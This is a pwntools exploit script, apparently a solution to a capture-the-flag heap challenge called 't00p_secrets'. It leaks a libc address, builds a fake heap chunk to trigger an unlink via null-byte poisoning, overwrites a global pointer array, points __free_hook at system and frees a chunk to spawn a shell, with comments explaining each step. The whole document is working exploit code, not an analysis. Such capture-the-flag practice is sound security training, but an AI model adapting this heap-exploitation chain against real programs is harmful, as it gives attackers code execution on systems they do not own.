from pwn import *

key    = "wjigaep;r[jg]ahrg[es9hrg"
array  = 0x602068 + 0xa*8
fd     = array - (3*8)
bk     = array - (2*8)

def enter_key():
	r.sendafter(': ', key)
	return

# mode 1 leads to null byte poisoning
def alloc(idx, size, mode, data):
	r.sendlineafter('> ', '1')
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', str(size))
	r.sendlineafter(': ', str(mode))
	
	if len(data) < size:
		data += '\n'
	r.sendafter(': ', data)

	return

def free(idx):
	r.sendlineafter('> ', '2')
	r.sendlineafter(': ', str(idx))
	return

def Print(idx):
	r.sendlineafter('> ', '5')
	r.sendlineafter(': ', str(idx))
	return

def edit(idx, mode, data, size):
	r.sendlineafter('> ', '3')
	r.sendlineafter(': ', str(idx))
	r.sendlineafter(': ', str(mode))

	if len(data) < size:
		data += '\n'
	r.sendafter(': ', data)
	return

def leak(idx, ru):
	Print(idx)
	r.recvuntil(ru)
	return u64(r.recv(6).ljust(8, '\x00'))

def pwn():

	enter_key()

	alloc(0, 0x80, 0, 'A'*8)
	alloc(1, 0x80, 0, 'B'*8)

	free(0)

	alloc(0, 0x10, 0, 'C'*7)

	libc     = leak(0, 'C'*7 + '\n') - 0x3c4bf8
	fhook    = libc + 0x3c67a8 
	system   = libc + 0x45390
	sh       = libc + 0x18cd57
	log.success("Libc:        0x{:x}".format(libc))
	log.success("system:      0x{:x}".format(system))
	log.success("__free_hook: 0x{:x}".format(fhook))

	# Clean up the heap
	free(0)
	free(1)

	alloc(0, 0x88, 0,  'A'*8)
	alloc(1, 0x100, 0, 'B'*8)
	alloc(2, 0x68, 0,  'C'*8)

	# Take care of the next chunk's size check in _int_free so that unlink doesn't abort 
	# See https://github.com/str4tan/heapwn/blob/master/malloc/_int_free.c#L147
	edit(1, 0, p64(0)*30 + p64(0x100) + p64(0x31), 0x100)
	# Take care of the next chunk's next chunk size
	edit(2, 0, p64(0)*3 + p64(0x31) + p64(0)*5 + p64(0x21), 0x68)
	# Set up fake heap chunk to consolidate
	fake_chunk  = p64(0)
	fake_chunk += p64(0x8)
	fake_chunk += p64(fd)
	fake_chunk += p64(bk)
	fake_chunk += 'A'*0x60
	fake_chunk += p64(0x80)

	edit(0, 1, fake_chunk, 0x88)
	# Unlink => Consolidate => Overwrite 0th array entry with &array - 3*8.
	free(1)
	# Overwrite the global's array entries with __free_hook & sh's address
	# so that we can call edit on __free_hook afterwards and overwrite it
	# with system's address and finally call free on the 1st entry which
	# will effectively call system('sh').
	# Entries:                0th       1st       2nd
	edit(0, 0, p64(0)*3 + p64(fhook) + p64(0) + p64(sh), 0x88)
	# __free_hook => system
	edit(0, 0, p64(system), 0x88)
	# system('sh')
	free(2)
	
	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('',)
        pwn()
    else:
        r = process('./t00p_secrets')
        pause()
        pwn()
